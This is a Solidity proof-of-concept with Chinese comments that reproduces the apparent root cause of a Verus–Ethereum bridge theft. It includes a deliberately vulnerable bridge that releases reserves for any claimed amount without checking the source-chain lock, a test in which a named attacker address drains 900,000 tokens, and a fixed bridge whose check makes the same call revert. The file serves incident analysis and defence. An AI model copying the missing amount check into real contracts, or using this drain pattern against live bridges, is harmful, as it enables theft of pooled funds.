// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// ============================================================================
// Verus–Ethereum 跨链桥 "金额不守恒" 根因 PoC
//
// 根因(见技术复盘):桥的 submitImports(导入提交)在以太坊侧释放资产时,
// 没有强制校验 "释放金额 == 源链(Verus)真实锁定/销毁金额"。
// 攻击者提交伪造的 claimedAmount(远大于其真实存入)即可领走储备。
//
// 本 PoC 用最小模型忠实复现该根因:
//   ① VulnerableBridge.submitImports —— 直接按 claimedAmount 释放,不校验源链锁定额
//   ② attacker 用伪造 claimedAmount 调用,把储备抽走
//   ③ FixedBridge.submitImportsSafe —— 要求 claimedAmount <= lockedOnSource[user],
//      attacker 同样调用时 revert
// ============================================================================

// --------------------------------------------------------------------------
// 最小 ERC20(桥的储备资产),仅实现 PoC 所需功能
// --------------------------------------------------------------------------
contract MockToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// --------------------------------------------------------------------------
// ① 脆弱版桥:持有储备,submitImports 直接按 claimedAmount 释放
//    —— 缺失 "claimedAmount 是否真有等额源链锁定" 的金额守恒校验
// --------------------------------------------------------------------------
contract VulnerableBridge {
    MockToken public token;

    // 记录某用户在 Verus 侧"真实锁定/销毁"的金额(本应作为释放上限)
    // 脆弱版里它存在,但 submitImports 根本不读它 —— 这就是漏洞。
    mapping(address => uint256) public lockedOnSource;

    constructor(MockToken _token) {
        token = _token;
    }

    // 用于模拟:用户在 Verus 侧真实锁定了多少(此处由 PoC 写入)
    function setLockedOnSource(address user, uint256 amount) external {
        lockedOnSource[user] = amount;
    }

    // 脆弱的导入提交:接受攻击者声明的 claimedAmount,直接释放等额储备。
    // 真实合约校验了凭证格式等,但唯独没有强制 "释放额 == 源链真实锁定额"。
    function submitImports(uint256 claimedAmount, address to) external {
        // ❌ 这里本应有: require(claimedAmount <= lockedOnSource[to], ...);
        //    但脆弱版没有 —— 跨端金额不守恒。
        token.transfer(to, claimedAmount);
    }

    function reserve() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}

// --------------------------------------------------------------------------
// ③ 修复版桥:submitImportsSafe 强制 claimedAmount <= lockedOnSource[to]
//    —— 释放金额与源链真实锁定金额绑定,金额守恒
// --------------------------------------------------------------------------
contract FixedBridge {
    MockToken public token;
    mapping(address => uint256) public lockedOnSource;

    constructor(MockToken _token) {
        token = _token;
    }

    function setLockedOnSource(address user, uint256 amount) external {
        lockedOnSource[user] = amount;
    }

    // 修复:强制金额守恒,并在释放后扣减已用额度(防重放/超额)
    function submitImportsSafe(uint256 claimedAmount, address to) external {
        // ✅ 金额守恒校验:释放额不得超过源链真实锁定/销毁额
        require(claimedAmount <= lockedOnSource[to], "amount not conserved");
        lockedOnSource[to] -= claimedAmount;
        token.transfer(to, claimedAmount);
    }

    function reserve() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}

// ============================================================================
// 测试(不依赖 forge-std)
// ============================================================================
contract VerusPoCTest {
    MockToken token;

    // 用一个固定地址代表攻击者(对应链上发起地址 0x5aBb91...5777 的角色)
    address constant ATTACKER = address(0x5aBb91B9c01A5Ed3aE762d32B236595B459D5777);

    uint256 constant RESERVE = 1_000_000e18; // 桥的储备
    uint256 constant REAL_DEPOSIT = 1e18;    // 攻击者真实存入(源链锁定)
    uint256 constant FAKE_CLAIM = 900_000e18;// 攻击者伪造声明的导入金额(远超存入)

    // ---- ② 漏洞利用:脆弱版让攻击者凭伪造金额抽走储备 ----
    function testExploit_VulnerableBridge_DrainsReserve() external {
        VulnerableBridge bridge = new VulnerableBridge(token = new MockToken());
        token.mint(address(bridge), RESERVE);

        // 攻击者在源链真的只锁定了 1e18,桥也如实记录
        bridge.setLockedOnSource(ATTACKER, REAL_DEPOSIT);

        require(bridge.reserve() == RESERVE, "setup: reserve");
        require(token.balanceOf(ATTACKER) == 0, "setup: attacker zero");

        // 核心利用:攻击者提交伪造的 claimedAmount = 900_000e18(远超其 1e18 锁定)
        // 脆弱版不校验金额守恒,直接释放。
        bridge.submitImports(FAKE_CLAIM, ATTACKER);

        // 断言:攻击者凭空领走 900_000e18,储备被抽干到 100_000e18
        require(token.balanceOf(ATTACKER) == FAKE_CLAIM, "attacker did not receive fake claim");
        require(bridge.reserve() == RESERVE - FAKE_CLAIM, "reserve not drained");

        // 关键:领走额(FAKE_CLAIM)远大于真实锁定额(REAL_DEPOSIT)= 金额不守恒
        require(FAKE_CLAIM > bridge.lockedOnSource(ATTACKER) , "should exceed locked");
        require(token.balanceOf(ATTACKER) > REAL_DEPOSIT, "exploit profit not realized");
    }

    // ---- ③ 对照:修复版强制金额守恒,攻击者同样调用时 revert ----
    function testFixed_RejectsForgedClaim() external {
        FixedBridge bridge = new FixedBridge(token = new MockToken());
        token.mint(address(bridge), RESERVE);
        bridge.setLockedOnSource(ATTACKER, REAL_DEPOSIT);

        // 攻击者用同样的伪造 claimedAmount 调用修复版 —— 必须 revert
        (bool ok, ) = address(bridge).call(
            abi.encodeWithSelector(FixedBridge.submitImportsSafe.selector, FAKE_CLAIM, ATTACKER)
        );
        require(!ok, "fixed bridge must reject forged (over-locked) claim");

        // 储备分文未动
        require(bridge.reserve() == RESERVE, "reserve must be untouched after revert");
        require(token.balanceOf(ATTACKER) == 0, "attacker must receive nothing");
    }

    // ---- 正常路径:修复版允许 <= 真实锁定额的合法导入 ----
    function testFixed_AllowsHonestClaim() external {
        FixedBridge bridge = new FixedBridge(token = new MockToken());
        token.mint(address(bridge), RESERVE);
        bridge.setLockedOnSource(ATTACKER, REAL_DEPOSIT);

        // 合法导入:claimedAmount == 真实锁定额
        bridge.submitImportsSafe(REAL_DEPOSIT, ATTACKER);

        require(token.balanceOf(ATTACKER) == REAL_DEPOSIT, "honest claim must succeed");
        require(bridge.reserve() == RESERVE - REAL_DEPOSIT, "reserve reduced by honest amount only");
        require(bridge.lockedOnSource(ATTACKER) == 0, "locked credit must be consumed");
    }
}
